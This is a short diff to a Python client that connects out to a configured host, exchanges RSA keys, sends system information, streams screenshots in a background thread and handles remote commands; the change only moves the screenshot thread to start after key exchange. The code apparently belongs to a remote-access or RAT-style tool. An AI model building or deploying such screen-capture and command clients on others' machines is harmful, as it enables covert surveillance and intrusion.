@@ -2,7 +2,6 @@ import socket
 import os
 import platform
 import time
-
 import rsa
 import pyscreenshot as ImageGrab
 from threading import *
@@ -358,15 +357,15 @@ def main():
 
     live_screen_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     live_screen_socket.connect((IP, PORT))
-    print("Live screen connected")
-
-    live_screen = Thread(target=lambda: keep_sending_screenshots(live_screen_socket))
-    live_screen.start()
 
     send_public_key(client_socket)
     get_host_key(client_socket)
 
     wait_to_host_key()
+
+    live_screen = Thread(target=lambda: keep_sending_screenshots(live_screen_socket))
+    live_screen.start()
+    print("Live screen connected")
 
     send_basic_info(client_socket)
 
@@ -385,9 +384,9 @@ def main():
             cmd = "Wrong format"
         send_response(client_socket, cmd_type, cmd)
 
-    print("exited!")
     is_alive = False
     client_socket.close()
+    print("exited!")
 
 
 if __name__ == "__main__":
